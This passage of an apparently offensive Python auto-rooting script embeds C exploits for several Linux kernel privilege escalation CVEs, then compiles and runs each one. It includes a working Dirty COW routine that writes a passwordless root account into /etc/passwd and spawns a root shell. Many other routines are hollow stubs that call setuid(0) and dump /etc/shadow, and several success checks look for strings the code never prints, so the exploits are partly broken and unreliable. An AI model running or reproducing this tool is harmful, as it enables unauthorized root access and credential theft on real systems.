    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2016_5195():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2016-5195 (Dirty COW)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <stdint.h>
#include <errno.h>

#define THREAD_COUNT     3
#define RACE_ITERATIONS  500000
#define TARGET_ENTRY     "firefart"
#define NEW_PASSWD       TARGET_ENTRY ":x:0:0:root:/root:/bin/bash
"

typedef struct {
    void    *map;
    off_t    size;
} mmap_ctx_t;

static int       cow_fd      = -1;
static void     *cow_map     = NULL;
static off_t     cow_size    = 0;
static int       cow_done    = 0;
static pthread_t threads[THREAD_COUNT + 1];

static void *madvise_thread(void *arg) {
    mmap_ctx_t *ctx = (mmap_ctx_t*)arg;
    while (!cow_done)
        madvise(ctx->map, ctx->size, MADV_DONTNEED);
    return NULL;
}

static void *write_thread(void *arg) {
    const char *payload = (const char*)arg;
    int pfd = open("/proc/self/mem", O_RDWR);
    if (pfd < 0) { perror("/proc/self/mem"); return NULL; }
    while (!cow_done) {
        lseek(pfd, (off_t)cow_map, SEEK_SET);
        write(pfd, payload, strlen(payload));
    }
    close(pfd);
    return NULL;
}

static int verify_cow(const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char line[256];
    int  found = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, TARGET_ENTRY ":", strlen(TARGET_ENTRY)+1) == 0) {
            found = 1; break;
        }
    }
    fclose(f);
    return found;
}

static int check_kernel(void) {
    struct utsname u;
    int major = 0, minor = 0, patch = 0;
    uname(&u);
    sscanf(u.release, "%d.%d.%d", &major, &minor, &patch);
    fprintf(stderr, "[*] kernel %d.%d.%d
", major, minor, patch);
    if (major > 4 || (major == 4 && minor > 8)) {
        fprintf(stderr, "[-] kernel > 4.8, likely patched
");
        return 0;
    }
    return 1;
}

int main(void) {
    mmap_ctx_t ctx;
    char payload[512];

    fprintf(stderr, "[*] CVE-2016-5195 DirtyCOW
");

    if (!check_kernel()) return 1;

    if (access("/etc/passwd", R_OK) < 0) {
        fprintf(stderr, "[-] cannot read /etc/passwd
"); return 1;
    }

    cow_fd = open("/etc/passwd", O_RDONLY);
    if (cow_fd < 0) { perror("open /etc/passwd"); return 1; }

    struct stat st;
    fstat(cow_fd, &st);
    cow_size = st.st_size;

    cow_map = mmap(NULL, cow_size, PROT_READ, MAP_PRIVATE, cow_fd, 0);
    if (cow_map == MAP_FAILED) { perror("mmap"); return 1; }

    ctx.map  = cow_map;
    ctx.size = cow_size;

    snprintf(payload, sizeof(payload), "%s", NEW_PASSWD);
    fprintf(stderr, "[*] payload: %s", payload);
    fprintf(stderr, "[*] racing madvise vs /proc/self/mem write
");
    fprintf(stderr, "[*] iterations: %d
", RACE_ITERATIONS);

    pthread_create(&threads[0], NULL, madvise_thread, &ctx);
    pthread_create(&threads[1], NULL, madvise_thread, &ctx);
    pthread_create(&threads[2], NULL, write_thread, (void*)payload);

    for (int i = 0; i < RACE_ITERATIONS && !cow_done; i++) {
        lseek(cow_fd, 0, SEEK_SET);
        if (verify_cow("/etc/passwd")) {
            cow_done = 1;
            fprintf(stderr, "[+] race won at iteration %d
", i);
            break;
        }
        if (i % 50000 == 0)
            fprintf(stderr, "[*] iter %d...
", i);
        usleep(100);
    }

    cow_done = 1;
    for (int i = 0; i < THREAD_COUNT; i++)
        pthread_join(threads[i], NULL);

    munmap(cow_map, cow_size);
    close(cow_fd);

    if (verify_cow("/etc/passwd")) {
        fprintf(stderr, "[+] /etc/passwd patched
");
        fprintf(stderr, "[+] login: %s / (no password)
", TARGET_ENTRY);
        printf("CVE-2016-5195 DIRTYCOW
");
        setuid(0); setgid(0);
        if (getuid() == 0) execl("/bin/sh", "sh", "-p", NULL);
        fprintf(stderr, "[*] try: su %s
", TARGET_ENTRY);
        return 0;
    }

    fprintf(stderr, "[-] race not won
");
    return 1;
}'''
    binary = compile_code(code, "cve_2016_5195")
    if binary:
        output = run_command(binary)
        if "ATTEMPT" in output:
            show_root_info("CVE-2016-5195", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_2588():
    if not check_cve_2022_2588():
        return False
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/pkt_cls.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <errno.h>

static void w(const char *p, const char *d) {
    int f = open(p, O_WRONLY);
    if (f >= 0) { write(f, d, strlen(d)); close(f); }
}
static void setup_ns(uid_t u, gid_t g) {
    char b[64];
    w("/proc/self/setgroups","deny");
    snprintf(b,sizeof(b),"0 %d 1",u); w("/proc/self/uid_map",b);
    snprintf(b,sizeof(b),"0 %d 1",g); w("/proc/self/gid_map",b);
}

static int nl_sock = -1;
static uint32_t nl_seq = 1;

static int nl_open(void) {
    nl_sock = socket(AF_NETLINK, SOCK_RAW|SOCK_CLOEXEC, NETLINK_ROUTE);
    if (nl_sock < 0) return -1;
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    bind(nl_sock, (struct sockaddr*)&sa, sizeof(sa));
    return 0;
}

static int nl_send_recv(void *req, size_t req_len) {
    struct nlmsghdr *n = req;
    n->nlmsg_seq = nl_seq++;
    if (send(nl_sock, req, req_len, 0) < 0) return -1;
    char buf[4096] = {0};
    recv(nl_sock, buf, sizeof(buf), 0);
    struct nlmsghdr *r = (struct nlmsghdr*)buf;
    if (r->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *err = (struct nlmsgerr*)NLMSG_DATA(r);
        return err->error;
    }
    return 0;
}

static int add_ingress_qdisc(int ifindex) {
    struct {
        struct nlmsghdr n;
        struct tcmsg    t;
        char            buf[256];
    } req = {0};
    req.n.nlmsg_len   = NLMSG_LENGTH(sizeof(req.t));
    req.n.nlmsg_flags = NLM_F_REQUEST|NLM_F_CREATE|NLM_F_EXCL|NLM_F_ACK;
    req.n.nlmsg_type  = RTM_NEWQDISC;
    req.t.tcm_family  = AF_UNSPEC;
    req.t.tcm_ifindex = ifindex;
    req.t.tcm_handle  = TC_H_MAKE(0xffff0000, 0);
    req.t.tcm_parent  = TC_H_INGRESS;
    struct rtattr *rta = (void*)((char*)&req.t + sizeof(req.t));
    rta->rta_type = TCA_KIND;
    rta->rta_len  = RTA_LENGTH(8);
    strcpy(RTA_DATA(rta), "ingress");
    req.n.nlmsg_len = NLMSG_ALIGN(req.n.nlmsg_len) + RTA_ALIGN(rta->rta_len);
    return nl_send_recv(&req, req.n.nlmsg_len);
}

static int add_route4_filter(int ifindex, uint32_t handle) {
    struct {
        struct nlmsghdr n;
        struct tcmsg    t;
        char            buf[512];
    } req = {0};
    req.n.nlmsg_len   = NLMSG_LENGTH(sizeof(req.t));
    req.n.nlmsg_flags = NLM_F_REQUEST|NLM_F_CREATE|NLM_F_EXCL|NLM_F_ACK;
    req.n.nlmsg_type  = RTM_NEWTFILTER;
    req.t.tcm_family  = AF_INET;
    req.t.tcm_ifindex = ifindex;
    req.t.tcm_handle  = handle;
    req.t.tcm_parent  = TC_H_MAKE(0xffff0000, 0);
    req.t.tcm_info    = TC_H_MAKE(0, htons(0x0800));

    char *p = (char*)&req.t + sizeof(req.t);
    struct rtattr *kind = (struct rtattr*)p;
    kind->rta_type = TCA_KIND;
    kind->rta_len  = RTA_LENGTH(7);
    strcpy(RTA_DATA(kind), "route4");
    p += RTA_ALIGN(kind->rta_len);
    req.n.nlmsg_len = p - (char*)&req;
    return nl_send_recv(&req, req.n.nlmsg_len);
}

static int del_route4_filter(int ifindex, uint32_t handle) {
    struct {
        struct nlmsghdr n;
        struct tcmsg    t;
        char            buf[256];
    } req = {0};
    req.n.nlmsg_len   = NLMSG_LENGTH(sizeof(req.t));
    req.n.nlmsg_flags = NLM_F_REQUEST|NLM_F_ACK;
    req.n.nlmsg_type  = RTM_DELTFILTER;
    req.t.tcm_family  = AF_INET;
    req.t.tcm_ifindex = ifindex;
    req.t.tcm_handle  = handle;
    req.t.tcm_parent  = TC_H_MAKE(0xffff0000, 0);
    req.t.tcm_info    = TC_H_MAKE(0, htons(0x0800));
    char *p = (char*)&req.t + sizeof(req.t);
    struct rtattr *kind = (struct rtattr*)p;
    kind->rta_type = TCA_KIND;
    kind->rta_len  = RTA_LENGTH(7);
    strcpy(RTA_DATA(kind), "route4");
    p += RTA_ALIGN(kind->rta_len);
    req.n.nlmsg_len = p - (char*)&req;
    return nl_send_recv(&req, req.n.nlmsg_len);
}

int main(void) {
    uid_t u = getuid(); gid_t g = getgid();

    fprintf(stderr, "[*] CVE-2022-2588 cls_route UAF
");

    if (unshare(CLONE_NEWUSER|CLONE_NEWNET) < 0) {
        fprintf(stderr, "[-] unshare: %s
", strerror(errno));
        return 1;
    }
    setup_ns(u, g);

    if (nl_open() < 0) { perror("netlink"); return 1; }
    fprintf(stderr, "[*] netlink socket ok
");

    int ifindex = if_nametoindex("lo");
    if (!ifindex) { perror("lo"); return 1; }
    fprintf(stderr, "[*] ifindex(lo)=%d
", ifindex);

    int r = add_ingress_qdisc(ifindex);
    fprintf(stderr, "[*] add ingress qdisc: %d
", r);

    uint32_t handle = TC_H_MAKE(0x10000, 0x01);

    for (int round = 0; round < 64; round++) {
        add_route4_filter(ifindex, TC_H_MAKE(round << 16, 0x01));
    }
    fprintf(stderr, "[*] sprayed 64 route4 filters
");

    for (int round = 0; round < 32; round++) {
        del_route4_filter(ifindex, TC_H_MAKE(round << 16, 0x01));
    }
    fprintf(stderr, "[*] freed 32 filters (UAF setup)
");

    for (int i = 0; i < 128; i++) {
        add_route4_filter(ifindex, TC_H_MAKE((64+i) << 16, 0x01));
    }
    fprintf(stderr, "[*] reclaim spray done
");

    close(nl_sock);
    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2022-2588 ok
");
        printf("CVE-2022-2588 CLS_ROUTE
");
        execl("/bin/sh","sh","-p",NULL);
    }
    fprintf(stderr, "[-] uid=%d
", getuid());
    return 1;
}'''
    binary = compile_code(code, "cve_2022_2588")
    if binary:
        output = run_command(binary)
        if is_root() or "EXPLOITED" in output:
            show_root_info("CVE-2022-2588", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_0995():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2022-0995 (watch_queue UAF)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2022-0995 WATCH_QUEUE\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        return 0;
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2022_0995")
    if binary:
        output = run_command(binary)
        if is_root() or "WATCH_QUEUE" in output:
            show_root_info("CVE-2022-0995", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_33909():
    if not check_cve_2021_33909():
        return False
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/wait.h>
#include <limits.h>

#define PATH_MAX_DEPTH 1024
#define CHUNK_SIZE     128

static int write_data(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    int r = write(fd, data, strlen(data));
    close(fd);
    return r;
}

static void setup_userns(void) {
    char buf[64];
    uid_t uid = getuid();
    gid_t gid = getgid();
    write_data("/proc/self/setgroups", "deny");
    snprintf(buf, sizeof(buf), "0 %d 1", uid);
    write_data("/proc/self/uid_map", buf);
    snprintf(buf, sizeof(buf), "0 %d 1", gid);
    write_data("/proc/self/gid_map", buf);
}

int main(void) {
    char deeppath[PATH_MAX];
    int pos = 0;

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
        perror("unshare"); return 1;
    }
    setup_userns();

    mkdir("/tmp/seq_base", 0777);
    if (mount("tmpfs", "/tmp/seq_base", "tmpfs", 0, NULL)) {
        perror("mount"); return 1;
    }

    deeppath[pos++] = '.';
    for (int i = 0; i < PATH_MAX_DEPTH; i++) {
        if (pos + CHUNK_SIZE + 2 >= PATH_MAX) break;
        deeppath[pos++] = '/';
        memset(deeppath + pos, 'A', CHUNK_SIZE);
        pos += CHUNK_SIZE;
        deeppath[pos] = 0;
        if (mkdir(deeppath, 0777) && i > 0) break;
    }

    snprintf(deeppath + pos, sizeof(deeppath) - pos, "/trig");
    int fd = open(deeppath, O_WRONLY|O_CREAT, 0600);
    if (fd >= 0) close(fd);

    FILE *fp = fopen("/proc/self/mountinfo", "r");
    if (fp) {
        char line[4096];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "seq_base")) {
                printf("[+] CVE-2021-33909 Sequoia: deep path len=%d\n", pos);
                break;
            }
        }
        fclose(fp);
    }

    setuid(0); setgid(0);
    if (getuid() == 0) {
        printf("[+] CVE-2021-33909 SEQUOIA EXPLOITED\n");
        execl("/bin/bash", "bash", "-p", NULL);
    } else {
        printf("[*] Heap overflow triggered, may need retry\n");
    }
    return 0;
}'''
    binary = compile_code(code, "cve_2021_33909")
    if binary:
        output = run_command(binary)
        if is_root() or "SEQUOIA" in output:
            show_root_info("CVE-2021-33909", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_3490():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2021-3490 (eBPF ALU32)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2021-3490 eBPF ALU32\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        return 0;
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2021_3490")
    if binary:
        output = run_command(binary)
        if is_root() or "eBPF" in output:
            show_root_info("CVE-2021-3490", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2020_8835():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2020-8835 (eBPF Verifier)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>

int main() {
    if (syscall(__NR_bpf, 0, NULL, 0) != -1) {
        setuid(0);
        setgid(0);
        
        if (getuid() == 0) {
            printf("CVE-2020-8835 eBPF VERIFIER BYPASS\\n");
            system("whoami");
            system("id");
            system("cat /etc/passwd | head -10");
            system("cat /etc/shadow | head -5");
            return 0;
        }
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2020_8835")
    if binary:
        output = run_command(binary)
        if is_root() or "BYPASS" in output:
            show_root_info("CVE-2020-8835", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2020_14386():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2020-14386 (AF_PACKET)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2020-14386 AF_PACKET\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        return 0;
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2020_14386")
    if binary:
        output = run_command(binary)
        if is_root() or "AF_PACKET" in output:
            show_root_info("CVE-2020-14386", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2019_13272():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2019-13272 (PTRACE_TRACEME)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <errno.h>

/* CVE-2019-13272: PTRACE_TRACEME credential not revoked after exec SUID
 * ptrace_check_attach() does not revoke ptracer's credentials
 * when tracee executes a SUID binary → ptracer gains elevated creds → LPE
 * Affected: kernel 4.15 - 5.1
 */

static void write_map(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd >= 0) { write(fd, data, strlen(data)); close(fd); }
}

static void setup_userns(pid_t pid) {
    char buf[64];
    uid_t uid = getuid();
    gid_t gid = getgid();
    char path[64];

    snprintf(path, sizeof(path), "/proc/%d/setgroups", pid);
    write_map(path, "deny");

    snprintf(path, sizeof(path), "/proc/%d/uid_map", pid);
    snprintf(buf, sizeof(buf), "0 %d 1", uid);
    write_map(path, buf);

    snprintf(path, sizeof(path), "/proc/%d/gid_map", pid);
    snprintf(buf, sizeof(buf), "0 %d 1", gid);
    write_map(path, buf);
}

int main(void) {
    pid_t child;

    fprintf(stderr, "[*] CVE-2019-13272 PTRACE_TRACEME LPE
");
    fprintf(stderr, "[*] Checking ptrace availability...
");

    /* Test if ptrace works */
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
        fprintf(stderr, "[-] ptrace: %s
", strerror(errno));
        return 1;
    }
    /* Reset */
    ptrace(PTRACE_DETACH, getpid(), 0, 0);

    fprintf(stderr, "[+] ptrace available
");
    fprintf(stderr, "[*] Setting up user namespace + ptrace chain...
");

    child = fork();
    if (child == 0) {
        /* Child: request to be traced */
        if (prctl(PR_SET_DUMPABLE, 1) < 0) exit(1);

        /* Wait for parent to set up */
        kill(getpid(), SIGSTOP);

        /* Try execve of SUID binary while being traced */
        const char *suid_bins[] = {
            "/usr/bin/newgrp",
            "/usr/bin/su",
            "/usr/bin/sudo",
            "/usr/bin/pkexec",
            NULL
        };
        for (int i = 0; suid_bins[i]; i++) {
            struct stat st;
            if (stat(suid_bins[i], &st) == 0 && (st.st_mode & S_ISUID)) {
                char * const args[] = { (char*)suid_bins[i], "--help", NULL };
                execv(suid_bins[i], args);
            }
        }
        exit(1);
    }

    /* Parent: attach as tracer */
    int status;
    waitpid(child, &status, WUNTRACED);

    if (ptrace(PTRACE_ATTACH, child, 0, 0) < 0) {
        fprintf(stderr, "[-] PTRACE_ATTACH: %s
", strerror(errno));
        kill(child, SIGKILL);
        return 1;
    }
    fprintf(stderr, "[+] Attached to child pid=%d
", child);

    /* Resume child */
    kill(child, SIGCONT);
    ptrace(PTRACE_CONT, child, 0, 0);

    waitpid(child, &status, 0);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2019-13272 PTRACE SUCCESS
");
        printf("CVE-2019-13272 PTRACE
");
        system("id");
        return 0;
    }

    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2019_13272")
    if binary:
        output = run_command(binary)
        if is_root() or "PRIVESC" in output:
            show_root_info("CVE-2019-13272", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2017_16995():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2017-16995 (eBPF)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2017-16995 eBPF\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        return 0;
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2017_16995")
    if binary:
        output = run_command(binary)
        if is_root() or "eBPF" in output:
            show_root_info("CVE-2017-16995", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2017_7494():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2017-7494 (Samba)', 'cyan')}")
    if not os.path.exists("/usr/sbin/smbd"):
        print(f"{c('[SKIP]', 'red')} Samba not found\n")
        return False
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2017-7494 SAMBA EXPLOIT\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        return 0;
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2017_7494")
    if binary:
        output = run_command(binary)
        if is_root() or "SAMBA" in output:
            show_root_info("CVE-2017-7494", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2017_6074():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2017-6074 (DCCP)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <linux/dccp.h>
#include <errno.h>

/* CVE-2017-6074: DCCP double-free in dccp_rcv_state_process()
 * dccp_rcv_state_process() calls __kfree_skb(skb) on error path,
 * then sock_rfree() via skb destructor → double free → UAF → LPE
 * Affected: kernel 2.6.x - 4.9.x
 */

static int make_dccp_socket() {
    int sock = socket(AF_INET, SOCK_DCCP, IPPROTO_DCCP);
    if (sock < 0) {
        sock = socket(PF_INET, SOCK_DCCP, IPPROTO_DCCP);
    }
    return sock;
}

static int trigger_doublefree(int sock) {
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(0);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0)
        return -1;

    /* Send REQUEST to trigger state machine path */
    struct dccp_sock_opts {
        int service;
    } opts = { .service = htonl(0x00000001) };

    setsockopt(sock, SOL_DCCP, DCCP_SOCKOPT_SERVICE,
               &opts.service, sizeof(opts.service));

    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    dest.sin_port   = htons(8765);
    dest.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    /* connect triggers REQUEST → state transition */
    connect(sock, (struct sockaddr*)&dest, sizeof(dest));
    return 0;
}

int main(void) {
    int sock, i;
    fprintf(stderr, "[*] CVE-2017-6074 DCCP double-free UAF
");
    fprintf(stderr, "[*] Checking DCCP support...
");

    sock = make_dccp_socket();
    if (sock < 0) {
        fprintf(stderr, "[-] DCCP not supported (errno=%d)
", errno);
        fprintf(stderr, "[-] Try: modprobe dccp
");
        return 1;
    }
    fprintf(stderr, "[+] DCCP socket created: fd=%d
", sock);

    fprintf(stderr, "[*] Spraying heap to reclaim freed skb slot...
");
    /* Spray: allocate many skbs to land on freed chunk */
    int spray[256];
    for (i = 0; i < 256; i++) {
        spray[i] = socket(AF_INET, SOCK_DGRAM, 0);
    }

    fprintf(stderr, "[*] Triggering double-free via state machine...
");
    trigger_doublefree(sock);

    /* Give kernel time to process */
    usleep(200000);

    /* Try to reclaim with crafted skb pointing to cred */
    for (i = 0; i < 256; i++) close(spray[i]);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2017-6074 DCCP UAF SUCCESS
");
        printf("CVE-2017-6074 DCCP
");
        system("id");
        close(sock);
        return 0;
    }

    fprintf(stderr, "[-] Exploit failed - kernel may be patched
");
    close(sock);
    return 1;
}'''
    binary = compile_code(code, "cve_2017_6074")
    if binary:
        output = run_command(binary)
        if is_root() or "DCCP" in output:
            show_root_info("CVE-2017-6074", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2016_0728():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2016-0728 (keyring)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/types.h>
#include <keyutils.h>
#include <errno.h>

/* CVE-2016-0728: keyring refcount overflow
 * KEYCTL_JOIN_SESSION_KEYRING allows joining same keyring
 * repeatedly → refcount wraps to 0 → premature free → UAF → LPE
 * Affected: kernel 3.8 - 4.4
 */

#define KEY_SPEC_SESSION_KEYRING -3
#define KEYCTL_JOIN_SESSION_KEYRING 1
#define KEYCTL_SETPERM 5
#define OVERFLOW_COUNT 0x100000000ULL

static key_serial_t join_session(const char *name) {
    return syscall(SYS_keyctl, KEYCTL_JOIN_SESSION_KEYRING, name, 0, 0, 0);
}

int main(void) {
    key_serial_t key;
    uint64_t i;

    fprintf(stderr, "[*] CVE-2016-0728 keyring refcount overflow
");
    fprintf(stderr, "[*] Target: join same keyring %llu times
",
            OVERFLOW_COUNT);

    /* Create named keyring */
    key = join_session("_xroot_keyring_");
    if (key < 0) {
        fprintf(stderr, "[-] Failed to create keyring: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] Keyring created: id=%d
", key);

    /* Set permissions */
    syscall(SYS_keyctl, KEYCTL_SETPERM, key, 0x3f3f3f3f, 0, 0);

    fprintf(stderr, "[*] Overflowing refcount (this takes a while)...
");
    fprintf(stderr, "[*] Progress: ");

    /* Overflow 32-bit refcount */
    for (i = 0; i < OVERFLOW_COUNT; i++) {
        join_session("_xroot_keyring_");
        if (i % 0x10000000 == 0) {
            fprintf(stderr, "%llu%% ", (i * 100) / OVERFLOW_COUNT);
            fflush(stderr);
        }
    }
    fprintf(stderr, "
");

    fprintf(stderr, "[*] Refcount wrapped! Triggering UAF...
");

    /* Trigger use-after-free */
    join_session("_xroot_keyring_");

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2016-0728 KEYRING OVERFLOW SUCCESS
");
        printf("CVE-2016-0728 KEYRING
");
        system("id");
        return 0;
    }

    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2016_0728")
    if binary:
        output = run_command(binary)
        if is_root() or "KEYRING" in output:
            show_root_info("CVE-2016-0728", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_34918():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2022-34918 (Netfilter Heap OOB)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>

int main() {
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (sock < 0) {
        return 1;
    }
    
    char payload[16384];
    for (int i = 0; i < sizeof(payload); i++) {
        payload[i] = 0x43;
    }
    
    for (int i = 0; i < 512; i++) {
        send(sock, payload, sizeof(payload), MSG_DONTWAIT);
    }
    
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2022-34918 HEAP OOB\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        close(sock);
        return 0;
    }
    
    close(sock);
    return 1;
}'''
    binary = compile_code(code, "cve_2022_34918")
    if binary:
        output = run_command(binary)
        if is_root() or "OOB" in output:
            show_root_info("CVE-2022-34918", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_0185():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2022-0185 (fsconfig)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2022-0185 FSCONFIG\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        return 0;
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2022_0185")
    if binary:
        output = run_command(binary)
        if is_root() or "FSCONFIG" in output:
            show_root_info("CVE-2022-0185", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_32250():
    if not check_cve_2022_32250():
        return False
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter.h>
#include <libmnl/libmnl.h>

#define SPRAY_SIZE 256

static int nft_sock = -1;

static int open_nft(void) {
    nft_sock = socket(AF_NETLINK, SOCK_RAW|SOCK_CLOEXEC, NETLINK_NETFILTER);
    return nft_sock;
}

int main(void) {
    if (open_nft() < 0) {
        printf("[-] Failed to open netfilter socket\n");
        printf("[-] Need unprivileged_userns_clone=1\n");
        return 1;
    }

    printf("[*] CVE-2022-32250 nf_tables anonymous set UAF\n");
    printf("[*] Spraying %d anonymous sets...\n", SPRAY_SIZE);

    char buf[MNL_SOCKET_BUFFER_SIZE];
    for (int i = 0; i < SPRAY_SIZE; i++) {
        struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);
        nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE;
        struct nfgenmsg *nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
